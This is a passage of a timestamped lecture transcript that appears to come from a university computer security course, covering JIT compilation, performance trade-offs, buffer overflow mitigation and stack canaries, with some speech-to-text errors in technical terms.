            </slice>
            <slice>
              <time_slice>20:47</time_slice>
              <text_slice>It's very high level,
it's dynamically tight,</text_slice>
            </slice>
            <slice>
              <time_slice>20:50</time_slice>
              <text_slice>right, it has automatic heat
management, things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>20:54</time_slice>
              <text_slice>So, typically, when these
languages first came out,</text_slice>
            </slice>
            <slice>
              <time_slice>20:58</time_slice>
              <text_slice>they were always interpreted.</text_slice>
            </slice>
            <slice>
              <time_slice>20:59</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>21:00</time_slice>
              <text_slice>And by interpreted I
mean they didn't actually</text_slice>
            </slice>
            <slice>
              <time_slice>21:02</time_slice>
              <text_slice>execute raw x86 instructions.</text_slice>
            </slice>
            <slice>
              <time_slice>21:04</time_slice>
              <text_slice>Instead, these languages
were compiled down</text_slice>
            </slice>
            <slice>
              <time_slice>21:06</time_slice>
              <text_slice>to some type of
intermediate form.</text_slice>
            </slice>
            <slice>
              <time_slice>21:07</time_slice>
              <text_slice>You may have heard of things
like the JVM, the Java Virtual</text_slice>
            </slice>
            <slice>
              <time_slice>21:11</time_slice>
              <text_slice>Machine byte code,
things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>21:13</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>21:13</time_slice>
              <text_slice>You basically had a
program that sat in a loop</text_slice>
            </slice>
            <slice>
              <time_slice>21:16</time_slice>
              <text_slice>and took these byte
codes, and basically</text_slice>
            </slice>
            <slice>
              <time_slice>21:18</time_slice>
              <text_slice>executed the high
level instruction that</text_slice>
            </slice>
            <slice>
              <time_slice>21:21</time_slice>
              <text_slice>was encoded in that byte code.</text_slice>
            </slice>
            <slice>
              <time_slice>21:22</time_slice>
              <text_slice>So, for example, some
of the JVM byte codes</text_slice>
            </slice>
            <slice>
              <time_slice>21:24</time_slice>
              <text_slice>dealt with things like
pushing and popping</text_slice>
            </slice>
            <slice>
              <time_slice>21:26</time_slice>
              <text_slice>things up on the stack.</text_slice>
            </slice>
            <slice>
              <time_slice>21:28</time_slice>
              <text_slice>So, you have a program that
would go through a loop,</text_slice>
            </slice>
            <slice>
              <time_slice>21:31</time_slice>
              <text_slice>operate that stack, and
simulate those operations.</text_slice>
            </slice>
            <slice>
              <time_slice>21:34</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>21:34</time_slice>
              <text_slice>So, that all seemed
fine and dandy, but once</text_slice>
            </slice>
            <slice>
              <time_slice>21:36</time_slice>
              <text_slice>again, all of the speed
freaks out there were like,</text_slice>
            </slice>
            <slice>
              <time_slice>21:38</time_slice>
              <text_slice>what about the perf?</text_slice>
            </slice>
            <slice>
              <time_slice>21:39</time_slice>
              <text_slice>This too slow.</text_slice>
            </slice>
            <slice>
              <time_slice>21:40</time_slice>
              <text_slice>You've got sort of
that interpreter</text_slice>
            </slice>
            <slice>
              <time_slice>21:42</time_slice>
              <text_slice>sitting in that
loop, and getting</text_slice>
            </slice>
            <slice>
              <time_slice>21:44</time_slice>
              <text_slice>in the way of our bare
metal performance.</text_slice>
            </slice>
            <slice>
              <time_slice>21:46</time_slice>
              <text_slice>So, what people started to do is
actually take these high level</text_slice>
            </slice>
            <slice>
              <time_slice>21:50</time_slice>
              <text_slice>interpreter languages
and dynamically</text_slice>
            </slice>
            <slice>
              <time_slice>21:52</time_slice>
              <text_slice>generate X86 code
for them on the fly.</text_slice>
            </slice>
            <slice>
              <time_slice>21:55</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>21:55</time_slice>
              <text_slice>So, in terms of just in
time compilation, that</text_slice>
            </slice>
            <slice>
              <time_slice>21:59</time_slice>
              <text_slice>means I take your
snippet of JavaScript,</text_slice>
            </slice>
            <slice>
              <time_slice>22:00</time_slice>
              <text_slice>I take your snippet
of Java whatever,</text_slice>
            </slice>
            <slice>
              <time_slice>22:03</time_slice>
              <text_slice>and I actually spend a
little bit of time upfront</text_slice>
            </slice>
            <slice>
              <time_slice>22:06</time_slice>
              <text_slice>to create actual raw
machine instructions.</text_slice>
            </slice>
            <slice>
              <time_slice>22:08</time_slice>
              <text_slice>Raw x86 that will run
directly on the bare metal.</text_slice>
            </slice>
            <slice>
              <time_slice>22:12</time_slice>
              <text_slice>So, I take that initial
performance hit for the Git</text_slice>
            </slice>
            <slice>
              <time_slice>22:14</time_slice>
              <text_slice>compilation, but then after
that, my program actually</text_slice>
            </slice>
            <slice>
              <time_slice>22:17</time_slice>
              <text_slice>does run on the raw hard drive.</text_slice>
            </slice>
            <slice>
              <time_slice>22:19</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>22:19</time_slice>
              <text_slice>So, things like
the perf argument</text_slice>
            </slice>
            <slice>
              <time_slice>22:22</time_slice>
              <text_slice>are not necessarily
as compelling</text_slice>
            </slice>
            <slice>
              <time_slice>22:23</time_slice>
              <text_slice>as they used to be,
because of stuff like this.</text_slice>
            </slice>
            <slice>
              <time_slice>22:25</time_slice>
              <text_slice>There's also some crazy
stuff out there, like ASN.js.</text_slice>
            </slice>
            <slice>
              <time_slice>22:29</time_slice>
              <text_slice>So, we can talk more
about this offline</text_slice>
            </slice>
            <slice>
              <time_slice>22:31</time_slice>
              <text_slice>if you actually are
a JavaScript packer.</text_slice>
            </slice>
            <slice>
              <time_slice>22:33</time_slice>
              <text_slice>But there are actually
some neat tricks</text_slice>
            </slice>
            <slice>
              <time_slice>22:34</time_slice>
              <text_slice>that you can do,
like compiling down</text_slice>
            </slice>
            <slice>
              <time_slice>22:36</time_slice>
              <text_slice>JavaScript to very restricted
subset of the language that</text_slice>
            </slice>
            <slice>
              <time_slice>22:39</time_slice>
              <text_slice>only operates on arrays.</text_slice>
            </slice>
            <slice>
              <time_slice>22:42</time_slice>
              <text_slice>Right, so what this allows
you to do is actually get rid</text_slice>
            </slice>
            <slice>
              <time_slice>22:44</time_slice>
              <text_slice>of a lot of the dynamic
typing overhead in standard</text_slice>
            </slice>
            <slice>
              <time_slice>22:46</time_slice>
              <text_slice>JavaScript, and you can actually
get JavaScript code now to run</text_slice>
            </slice>
            <slice>
              <time_slice>22:50</time_slice>
              <text_slice>within 2x of raw C
or C++ performance.</text_slice>
            </slice>
            <slice>
              <time_slice>22:54</time_slice>
              <text_slice>2x might sound like
a lot, but it used</text_slice>
            </slice>
            <slice>
              <time_slice>22:56</time_slice>
              <text_slice>to be things like 10x or 20z.</text_slice>
            </slice>
            <slice>
              <time_slice>22:58</time_slice>
              <text_slice>So, we're actually making a
lot of progress on that front.</text_slice>
            </slice>
            <slice>
              <time_slice>23:04</time_slice>
              <text_slice>And so the other thing to
keep in mind with performance,</text_slice>
            </slice>
            <slice>
              <time_slice>23:06</time_slice>
              <text_slice>too, is that a lot of times, you
don't need performance as much</text_slice>
            </slice>
            <slice>
              <time_slice>23:08</time_slice>
              <text_slice>you might think that you do.</text_slice>
            </slice>
            <slice>
              <time_slice>23:10</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>23:10</time_slice>
              <text_slice>So, think about it like this.</text_slice>
            </slice>
            <slice>
              <time_slice>23:12</time_slice>
              <text_slice>Let's say that your program
is actually IO bound.</text_slice>
            </slice>
            <slice>
              <time_slice>23:15</time_slice>
              <text_slice>So, it's not CPU bound.</text_slice>
            </slice>
            <slice>
              <time_slice>23:16</time_slice>
              <text_slice>In other words, let's
say that your program</text_slice>
            </slice>
            <slice>
              <time_slice>23:18</time_slice>
              <text_slice>spends most of its time
waiting for network input,</text_slice>
            </slice>
            <slice>
              <time_slice>23:20</time_slice>
              <text_slice>waiting for disk input,
waiting for user input,</text_slice>
            </slice>
            <slice>
              <time_slice>23:23</time_slice>
              <text_slice>things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>23:24</time_slice>
              <text_slice>In those types of cases,
you don't actually</text_slice>
            </slice>
            <slice>
              <time_slice>23:26</time_slice>
              <text_slice>need to have blazing
fast raw compute speed.</text_slice>
            </slice>
            <slice>
              <time_slice>23:29</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>23:29</time_slice>
              <text_slice>Because your program
actually isn't</text_slice>
            </slice>
            <slice>
              <time_slice>23:31</time_slice>
              <text_slice>spending a lot of time
doing that kind of stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>23:34</time_slice>
              <text_slice>So, once again, this
perf argument here,</text_slice>
            </slice>
            <slice>
              <time_slice>23:35</time_slice>
              <text_slice>you've got to take this
stuff with a grain of salt.</text_slice>
            </slice>
            <slice>
              <time_slice>23:37</time_slice>
              <text_slice>And I actually
see a lot students</text_slice>
            </slice>
            <slice>
              <time_slice>23:38</time_slice>
              <text_slice>who struggle with this.</text_slice>
            </slice>
            <slice>
              <time_slice>23:39</time_slice>
              <text_slice>So, for example,
I'll ask someone</text_slice>
            </slice>
            <slice>
              <time_slice>23:41</time_slice>
              <text_slice>to go out and write me
a very simple program</text_slice>
            </slice>
            <slice>
              <time_slice>23:43</time_slice>
              <text_slice>to parse a text file.</text_slice>
            </slice>
            <slice>
              <time_slice>23:44</time_slice>
              <text_slice>So, they spend all this time
trying to get this to work in C</text_slice>
            </slice>
            <slice>
              <time_slice>23:47</time_slice>
              <text_slice>or C++ and it's super fast and
uses the templates and all that</text_slice>
            </slice>
            <slice>
              <time_slice>23:49</time_slice>
              <text_slice>kind of stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>23:50</time_slice>
              <text_slice>But it's like a one
line solution in Python.</text_slice>
            </slice>
            <slice>
              <time_slice>23:53</time_slice>
              <text_slice>And it essentially
runs just as fast.</text_slice>
            </slice>
            <slice>
              <time_slice>23:55</time_slice>
              <text_slice>And you could develop
it much, much easier.</text_slice>
            </slice>
            <slice>
              <time_slice>23:57</time_slice>
              <text_slice>So, you just have to
take these perf arguments</text_slice>
            </slice>
            <slice>
              <time_slice>23:59</time_slice>
              <text_slice>with a grain of salt.</text_slice>
            </slice>
            <slice>
              <time_slice>24:01</time_slice>
              <text_slice>So, anyway, we've discussed
the three ways you can possibly</text_slice>
            </slice>
            <slice>
              <time_slice>24:06</time_slice>
              <text_slice>avoid buffer overflow.</text_slice>
            </slice>
            <slice>
              <time_slice>24:07</time_slice>
              <text_slice>So, just avoid bugs
in the first place.</text_slice>
            </slice>
            <slice>
              <time_slice>24:09</time_slice>
              <text_slice>LOL, that's difficult to do.</text_slice>
            </slice>
            <slice>
              <time_slice>24:11</time_slice>
              <text_slice>Approach two, you can
build tools to help</text_slice>
            </slice>
            <slice>
              <time_slice>24:13</time_slice>
              <text_slice>you discover those bugs.</text_slice>
            </slice>
            <slice>
              <time_slice>24:15</time_slice>
              <text_slice>Then approach three
is, in a certain sense,</text_slice>
            </slice>
            <slice>
              <time_slice>24:17</time_slice>
              <text_slice>you can push those
tools into the runtime.</text_slice>
            </slice>
            <slice>
              <time_slice>24:19</time_slice>
              <text_slice>You can actually hopefully
rely on some of their language</text_slice>
            </slice>
            <slice>
              <time_slice>24:22</time_slice>
              <text_slice>runtime features to prevent
you from seeing raw memory</text_slice>
            </slice>
            <slice>
              <time_slice>24:24</time_slice>
              <text_slice>addresses.</text_slice>
            </slice>
            <slice>
              <time_slice>24:25</time_slice>
              <text_slice>And you can do things
like balance checking,</text_slice>
            </slice>
            <slice>
              <time_slice>24:27</time_slice>
              <text_slice>and so on and so forth.</text_slice>
            </slice>
            <slice>
              <time_slice>24:29</time_slice>
              <text_slice>Once again, as we
discussed before,</text_slice>
            </slice>
            <slice>
              <time_slice>24:32</time_slice>
              <text_slice>there's a lot of legacy
C and C++ code out there.</text_slice>
            </slice>
            <slice>
              <time_slice>24:35</time_slice>
              <text_slice>So, it's difficult to apply
some of these techniques,</text_slice>
            </slice>
            <slice>
              <time_slice>24:38</time_slice>
              <text_slice>particularly number
two and number three,</text_slice>
            </slice>
            <slice>
              <time_slice>24:40</time_slice>
              <text_slice>if you've got to deal
with that legacy code.</text_slice>
            </slice>
            <slice>
              <time_slice>24:43</time_slice>
              <text_slice>So, how can we do buffer
overflow mitigation</text_slice>
            </slice>
            <slice>
              <time_slice>24:47</time_slice>
              <text_slice>despite all these challenges?</text_slice>
            </slice>
            <slice>
              <time_slice>24:49</time_slice>
              <text_slice>Besides just, you know, dropping
out of computer science classes</text_slice>
            </slice>
            <slice>
              <time_slice>24:53</time_slice>
              <text_slice>and becoming a painter,
or something like that.</text_slice>
            </slice>
            <slice>
              <time_slice>24:55</time_slice>
              <text_slice>So, what actually is going
on in a buffer overflow?</text_slice>
            </slice>
            <slice>
              <time_slice>24:59</time_slice>
              <text_slice>So, in a buffer overflow the
attacker exploits two things.</text_slice>
            </slice>
            <slice>
              <time_slice>25:11</time_slice>
              <text_slice>So, the first thing that the
attack is going to exploit</text_slice>
            </slice>
            <slice>
              <time_slice>25:15</time_slice>
              <text_slice>is gaining control over
the instruction pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>25:29</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>25:30</time_slice>
              <text_slice>And by this, I mean that
somehow, the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>25:33</time_slice>
              <text_slice>figures out
someplace in the code</text_slice>
            </slice>
            <slice>
              <time_slice>25:36</time_slice>
              <text_slice>that it can make the program
jump to against the program's</text_slice>
            </slice>
            <slice>
              <time_slice>25:39</time_slice>
              <text_slice>will.</text_slice>
            </slice>
            <slice>
              <time_slice>25:40</time_slice>
              <text_slice>Now, this is necessary but
insufficient for an attack</text_slice>
            </slice>
            <slice>
              <time_slice>25:43</time_slice>
              <text_slice>typically to happen.</text_slice>
            </slice>
            <slice>
              <time_slice>25:46</time_slice>
              <text_slice>Because the other thing that
the attacker needs to do</text_slice>
            </slice>
            <slice>
              <time_slice>25:48</time_slice>
              <text_slice>is basically make that pointer
point to malicious code.</text_slice>
            </slice>
            <slice>
              <time_slice>26:08</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>26:08</time_slice>
              <text_slice>So, how are we going to
basically make the hijacked</text_slice>
            </slice>
            <slice>
              <time_slice>26:12</time_slice>
              <text_slice>IP, instruction pointer,
point to something</text_slice>
            </slice>
            <slice>
              <time_slice>26:14</time_slice>
              <text_slice>that does something
useful for the attacker.</text_slice>
            </slice>
            <slice>
              <time_slice>26:18</time_slice>
              <text_slice>So, what's interesting
is that in many cases,</text_slice>
            </slice>
            <slice>
              <time_slice>26:20</time_slice>
              <text_slice>it's often fairly
straightforward</text_slice>
            </slice>
            <slice>
              <time_slice>26:24</time_slice>
              <text_slice>for the attacker to put some
interesting code in a memory.</text_slice>
            </slice>
            <slice>
              <time_slice>26:26</time_slice>
              <text_slice>So we looked at some of
those shell code attacks</text_slice>
            </slice>
            <slice>
              <time_slice>26:28</time_slice>
              <text_slice>in the last lecture, where you
can actually embed that attack</text_slice>
            </slice>
            <slice>
              <time_slice>26:31</time_slice>
              <text_slice>code in a string.</text_slice>
            </slice>
            <slice>
              <time_slice>26:32</time_slice>
              <text_slice>As we'll discuss a
little bit today and more</text_slice>
            </slice>
            <slice>
              <time_slice>26:35</time_slice>
              <text_slice>in the next lecture,
you can actually</text_slice>
            </slice>
            <slice>
              <time_slice>26:36</time_slice>
              <text_slice>take advantage of some
of the pre-existing code</text_slice>
            </slice>
            <slice>
              <time_slice>26:38</time_slice>
              <text_slice>the application has and
jump to in an unexpected way</text_slice>
            </slice>
            <slice>
              <time_slice>26:41</time_slice>
              <text_slice>to make some evil things happen.</text_slice>
            </slice>
            <slice>
              <time_slice>26:43</time_slice>
              <text_slice>So, typically, figuring out what
code the attacker wants to run,</text_slice>
            </slice>
            <slice>
              <time_slice>26:48</time_slice>
              <text_slice>maybe that's not as
challenging as actually</text_slice>
            </slice>
            <slice>
              <time_slice>26:49</time_slice>
              <text_slice>being able to force
the program to jump</text_slice>
            </slice>
            <slice>
              <time_slice>26:52</time_slice>
              <text_slice>to that location in memory.</text_slice>
            </slice>
            <slice>
              <time_slice>26:56</time_slice>
              <text_slice>And the reason why
that's tricky is</text_slice>
            </slice>
            <slice>
              <time_slice>26:58</time_slice>
              <text_slice>because, basically, the
attacker has to know in some way</text_slice>
            </slice>
            <slice>
              <time_slice>27:03</time_slice>
              <text_slice>where it should jump to.</text_slice>
            </slice>
            <slice>
              <time_slice>27:04</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>27:05</time_slice>
              <text_slice>So, as we'll see in a
second, and as you actually</text_slice>
            </slice>
            <slice>
              <time_slice>27:07</time_slice>
              <text_slice>saw in the last lecture, a lot
of these shell code attacks</text_slice>
            </slice>
            <slice>
              <time_slice>27:09</time_slice>
              <text_slice>actually take advantage of these
hard-coded locations in memory</text_slice>
            </slice>
            <slice>
              <time_slice>27:13</time_slice>
              <text_slice>where the instruction
pointer needs to get sent to.</text_slice>
            </slice>
            <slice>
              <time_slice>27:16</time_slice>
              <text_slice>So, some of the defenses
that we're about to look at</text_slice>
            </slice>
            <slice>
              <time_slice>27:18</time_slice>
              <text_slice>can actually randomize things
in terms of code layout, heap</text_slice>
            </slice>
            <slice>
              <time_slice>27:21</time_slice>
              <text_slice>layout, and make it a little
difficult for the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>27:24</time_slice>
              <text_slice>to figure out where
things are located.</text_slice>
            </slice>
            <slice>
              <time_slice>27:27</time_slice>
              <text_slice>So, let's look at one simple
mitigation approach first.</text_slice>
            </slice>
            <slice>
              <time_slice>27:33</time_slice>
              <text_slice>So, this is the idea
of stack canaries.</text_slice>
            </slice>
            <slice>
              <time_slice>27:42</time_slice>
              <text_slice>So, the basic idea
behind stack canaries</text_slice>
            </slice>
            <slice>
              <time_slice>27:45</time_slice>
              <text_slice>is that, during a
buffer overflow,</text_slice>
            </slice>
            <slice>
              <time_slice>27:48</time_slice>
              <text_slice>it's actually OK if we allow
the attacker to overwrite</text_slice>
            </slice>
            <slice>
              <time_slice>27:53</time_slice>
              <text_slice>the return address
if we can actually</text_slice>
            </slice>
            <slice>
              <time_slice>27:56</time_slice>
              <text_slice>catch that overwrite before
we actually jump to the place</text_slice>
            </slice>
            <slice>
              <time_slice>27:59</time_slice>
              <text_slice>that the attacker
wants us to go.</text_slice>
            </slice>
            <slice>
              <time_slice>28:02</time_slice>
              <text_slice>So, basically,
here's how it works.</text_slice>
            </slice>
            <slice>
              <time_slice>28:05</time_slice>
              <text_slice>Let's return to
Neal stack diagram.</text_slice>
            </slice>
            <slice>
              <time_slice>28:11</time_slice>
              <text_slice>Essentially we have to think
of it as a magic value.</text_slice>
            </slice>
            <slice>
              <time_slice>28:15</time_slice>
              <text_slice>Basically, in front
of the return address.</text_slice>
            </slice>
            <slice>
              <time_slice>28:20</time_slice>
              <text_slice>Such that any
overflow would have</text_slice>
            </slice>
            <slice>
              <time_slice>28:22</time_slice>
              <text_slice>to hit the canary first, and
then hit the return address.</text_slice>
            </slice>
            <slice>
              <time_slice>28:25</time_slice>
              <text_slice>And if we can check
that canary before we</text_slice>
            </slice>
            <slice>
              <time_slice>28:27</time_slice>
              <text_slice>return from the function,
then we can detect the evil.</text_slice>
            </slice>
            <slice>
              <time_slice>28:30</time_slice>
              <text_slice>So, let's say that, once again,
we've got the buffer here.</text_slice>
            </slice>
            <slice>
              <time_slice>28:44</time_slice>
              <text_slice>Then we're going to
put the canary here.</text_slice>
            </slice>
            <slice>
              <time_slice>28:53</time_slice>
              <text_slice>And then this will be the save
value of the break pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>29:02</time_slice>
              <text_slice>And then this will be
the return address.</text_slice>
            </slice>
            <slice>
              <time_slice>29:09</time_slice>
              <text_slice>So, once again, remember
the overflow goes this way.</text_slice>
            </slice>
            <slice>
              <time_slice>29:12</time_slice>
              <text_slice>So the idea is that
if the overflow wants</text_slice>
            </slice>
            <slice>
              <time_slice>29:16</time_slice>
              <text_slice>to get to that return
address, it first</text_slice>
            </slice>
            <slice>
              <time_slice>29:18</time_slice>
              <text_slice>has to trample on this
canary thing here, right?</text_slice>
            </slice>
            <slice>
              <time_slice>29:22</time_slice>
              <text_slice>You have a question?</text_slice>
            </slice>
            <slice>
              <time_slice>29:24</time_slice>
              <text_slice>AUDIENCE: Why does it
have to touch the canary?</text_slice>
            </slice>
            <slice>
              <time_slice>29:27</time_slice>
              <text_slice>PROFESSOR: Well,
because-- assuming</text_slice>
            </slice>
            <slice>
              <time_slice>29:29</time_slice>
              <text_slice>that the attacker
doesn't know how</text_slice>
            </slice>
            <slice>
              <time_slice>29:31</time_slice>
              <text_slice>to jump around in memory
arbitrarily-- the way</text_slice>
            </slice>
            <slice>
              <time_slice>29:34</time_slice>
              <text_slice>that tradionally [INAUDIBLE]
overflow attacks work</text_slice>
            </slice>
            <slice>
              <time_slice>29:36</time_slice>
              <text_slice>is that you look in GB, figure
out where all this stuff is.</text_slice>
            </slice>
            <slice>
              <time_slice>29:42</time_slice>
              <text_slice>And then, you essentially
have this string,</text_slice>
            </slice>
            <slice>
              <time_slice>29:44</time_slice>
              <text_slice>[INAUDIBLE] radius
grows this way.</text_slice>
            </slice>
            <slice>
              <time_slice>29:46</time_slice>
              <text_slice>Now, you're correct that
if the attacker could just</text_slice>
            </slice>
            <slice>
              <time_slice>29:49</time_slice>
              <text_slice>go here directly, then
all the bets are off.</text_slice>
            </slice>
            <slice>
              <time_slice>29:52</time_slice>
              <text_slice>But in the very simple
overflow approach,</text_slice>
            </slice>
            <slice>
              <time_slice>29:54</time_slice>
              <text_slice>everything just has to
grow strictly that way.</text_slice>
            </slice>
            <slice>
              <time_slice>29:57</time_slice>
              <text_slice>So the basic idea
behind the canary</text_slice>
            </slice>
            <slice>
              <time_slice>30:00</time_slice>
              <text_slice>is that we allow the buffer
overflow exploit to take place.</text_slice>
            </slice>
            <slice>
              <time_slice>30:03</time_slice>
              <text_slice>But then we have
run time code that,</text_slice>
            </slice>
            <slice>
              <time_slice>30:06</time_slice>
              <text_slice>at the time of the
return from the function,</text_slice>
            </slice>
            <slice>
              <time_slice>30:08</time_slice>
              <text_slice>is going to check this
canary and make sure</text_slice>
            </slice>
            <slice>
              <time_slice>30:11</time_slice>
              <text_slice>that it has the right value.</text_slice>
            </slice>
            <slice>
              <time_slice>30:12</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>30:13</time_slice>
              <text_slice>So it's called the canary
because back in the days, when</text_slice>
            </slice>
            <slice>
              <time_slice>30:15</time_slice>
              <text_slice>PETA wasn't around,
you could use</text_slice>
            </slice>
            <slice>
              <time_slice>30:17</time_slice>
              <text_slice>birds to test for evil things.</text_slice>
            </slice>
            <slice>
              <time_slice>30:18</time_slice>
              <text_slice>So that's why it's
called canary.</text_slice>
            </slice>
            <slice>
              <time_slice>30:20</time_slice>
              <text_slice>AUDIENCE: My question
is if the attacker is</text_slice>
            </slice>
            <slice>
              <time_slice>30:24</time_slice>
              <text_slice>able to overwrite the return
address, and modify the canary,</text_slice>
            </slice>
            <slice>
              <time_slice>30:31</time_slice>
              <text_slice>how does he check that the
canary was not modified,</text_slice>
            </slice>
            <slice>
              <time_slice>30:34</time_slice>
              <text_slice>but was going to be performed?</text_slice>
            </slice>
            <slice>
              <time_slice>30:37</time_slice>
              <text_slice>So the attacker overwrites
the return address, right?</text_slice>
            </slice>
            <slice>
              <time_slice>30:41</time_slice>
              <text_slice>So how is the check that
the canary was modified--</text_slice>
            </slice>
            <slice>
              <time_slice>30:47</time_slice>
              <text_slice>PROFESSOR: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>30:48</time_slice>
              <text_slice>So basically, you have to
have some piece of code</text_slice>
            </slice>
            <slice>
              <time_slice>30:50</time_slice>
              <text_slice>that will actually check this
before the return takes place.</text_slice>
            </slice>
            <slice>
              <time_slice>30:54</time_slice>
              <text_slice>So in other words, you're right.</text_slice>
            </slice>
            <slice>
              <time_slice>30:55</time_slice>
              <text_slice>There has to be
that order in there.</text_slice>
            </slice>
            <slice>
              <time_slice>30:58</time_slice>
              <text_slice>So essentially,
what you have to do</text_slice>
            </slice>
            <slice>
              <time_slice>31:00</time_slice>
              <text_slice>is you have to have a support
from the compiler here</text_slice>
            </slice>
            <slice>
              <time_slice>31:03</time_slice>
              <text_slice>that will actually extend
the calling convention,</text_slice>
            </slice>
            <slice>
              <time_slice>31:07</time_slice>
              <text_slice>if you will.</text_slice>
            </slice>
            <slice>
              <time_slice>31:08</time_slice>
              <text_slice>Such that part of
the return sequence</text_slice>
            </slice>
            <slice>
              <time_slice>31:10</time_slice>
              <text_slice>is before we actually
treat this value as valid,</text_slice>
            </slice>
            <slice>
              <time_slice>31:13</time_slice>
              <text_slice>make sure this guy
hasn't been trampled.</text_slice>
            </slice>
            <slice>
              <time_slice>31:16</time_slice>
              <text_slice>Then, and only then, can we
think of going somewhere else.</text_slice>
            </slice>
            <slice>
              <time_slice>31:18</time_slice>
              <text_slice>AUDIENCE: I think I might
be jumping the gun here,</text_slice>
            </slice>
            <slice>
              <time_slice>31:20</time_slice>
              <text_slice>but doesn't this assume
that the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>31:22</time_slice>
              <text_slice>can't find out or guess
what the canary value is?</text_slice>
            </slice>
            <slice>
              <time_slice>31:25</time_slice>
              <text_slice>PROFESSOR: That, in fact, is the
very next thing my lecture is.</text_slice>
            </slice>
            <slice>
              <time_slice>31:27</time_slice>
              <text_slice>If I had prizes, you'd get one.</text_slice>
            </slice>
            <slice>
              <time_slice>31:29</time_slice>
              <text_slice>I don't have any.</text_slice>
            </slice>
            <slice>
              <time_slice>31:30</time_slice>
              <text_slice>But good for you.</text_slice>
            </slice>
            <slice>
              <time_slice>31:30</time_slice>
              <text_slice>Gold star.</text_slice>
            </slice>
            <slice>
              <time_slice>31:31</time_slice>
              <text_slice>That's exactly correct.</text_slice>
            </slice>
            <slice>
              <time_slice>31:32</time_slice>
              <text_slice>So one of the next
things I'd like to say</text_slice>
            </slice>
            <slice>
              <time_slice>31:35</time_slice>
              <text_slice>is what's the problem
with this scheme?</text_slice>
            </slice>
            <slice>
              <time_slice>31:37</time_slice>
              <text_slice>What if, for example,
on every program,</text_slice>
            </slice>
            <slice>
              <time_slice>31:39</time_slice>
              <text_slice>we always put the value a?</text_slice>
            </slice>
            <slice>
              <time_slice>31:41</time_slice>
              <text_slice>Just like four values of a.</text_slice>
            </slice>
            <slice>
              <time_slice>31:44</time_slice>
              <text_slice>So this is like a single
[INAUDIBLE] at work, right?</text_slice>
            </slice>
            <slice>
              <time_slice>31:46</time_slice>
              <text_slice>Then you'd have
that exact problem</text_slice>
            </slice>
            <slice>
              <time_slice>31:47</time_slice>
              <text_slice>that you just mentioned.</text_slice>
            </slice>
            <slice>
              <time_slice>31:48</time_slice>
              <text_slice>Because then, the
attacker-- this</text_slice>
            </slice>
            <slice>
              <time_slice>31:50</time_slice>
              <text_slice>gets back to your question-- he
or she knows how big this is.</text_slice>
            </slice>
            <slice>
              <time_slice>31:54</time_slice>
              <text_slice>This is deterministic
on every system.</text_slice>
            </slice>
            <slice>
              <time_slice>31:57</time_slice>
              <text_slice>So you just make sure
that your buffer overflow</text_slice>
            </slice>
            <slice>
              <time_slice>31:58</time_slice>
              <text_slice>has a bunch of a's here, and
then you overwrite this side.</text_slice>
            </slice>
            <slice>
              <time_slice>32:01</time_slice>
              <text_slice>So you're exactly
right about that.</text_slice>
            </slice>
            <slice>
              <time_slice>32:02</time_slice>
              <text_slice>And so there's basically
different types of values</text_slice>
            </slice>
            <slice>
              <time_slice>32:05</time_slice>
              <text_slice>you could put between this
canary to try to prevent that.</text_slice>
            </slice>
            <slice>
              <time_slice>32:08</time_slice>
              <text_slice>One thing that
you can do here is</text_slice>
            </slice>
            <slice>
              <time_slice>32:10</time_slice>
              <text_slice>you can use-- this is sort of
a very funny type of canary,</text_slice>
            </slice>
            <slice>
              <time_slice>32:18</time_slice>
              <text_slice>but it basically
exploits the ways</text_slice>
            </slice>
            <slice>
              <time_slice>32:21</time_slice>
              <text_slice>that a lot of C
progams and C functions</text_slice>
            </slice>
            <slice>
              <time_slice>32:27</time_slice>
              <text_slice>handle special characters.</text_slice>
            </slice>
            <slice>
              <time_slice>32:29</time_slice>
              <text_slice>So imagine that you used
this value for the canary.</text_slice>
            </slice>
            <slice>
              <time_slice>32:32</time_slice>
              <text_slice>So the binary value is 0,
which is like the null byte,</text_slice>
            </slice>
            <slice>
              <time_slice>32:34</time_slice>
              <text_slice>the null character in ASCII.</text_slice>
            </slice>
            <slice>
              <time_slice>32:36</time_slice>
              <text_slice>Carriage return line feed,
and then the negative 1.</text_slice>
            </slice>
            <slice>
              <time_slice>32:41</time_slice>
              <text_slice>What's funny about this is that
a lot of the functions that you</text_slice>
            </slice>
            <slice>
              <time_slice>32:43</time_slice>
              <text_slice>can exploit-- that manipulate
strings, for example--</text_slice>
            </slice>
            <slice>
              <time_slice>32:47</time_slice>
              <text_slice>they will stop when they
encounter one of these words,</text_slice>
            </slice>
            <slice>
              <time_slice>32:50</time_slice>
              <text_slice>or one of these values.</text_slice>
            </slice>
            <slice>
              <time_slice>32:51</time_slice>
              <text_slice>So you can imagine that you're
using some string manipulation</text_slice>
            </slice>
            <slice>
              <time_slice>32:54</time_slice>
              <text_slice>function to go up this way.</text_slice>
            </slice>
            <slice>
              <time_slice>32:56</time_slice>
              <text_slice>It's going to hit
that null character.</text_slice>
            </slice>
            <slice>
              <time_slice>32:57</time_slice>
              <text_slice>Oops-- it's going
to stop processing.</text_slice>
            </slice>
            <slice>
              <time_slice>32:59</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
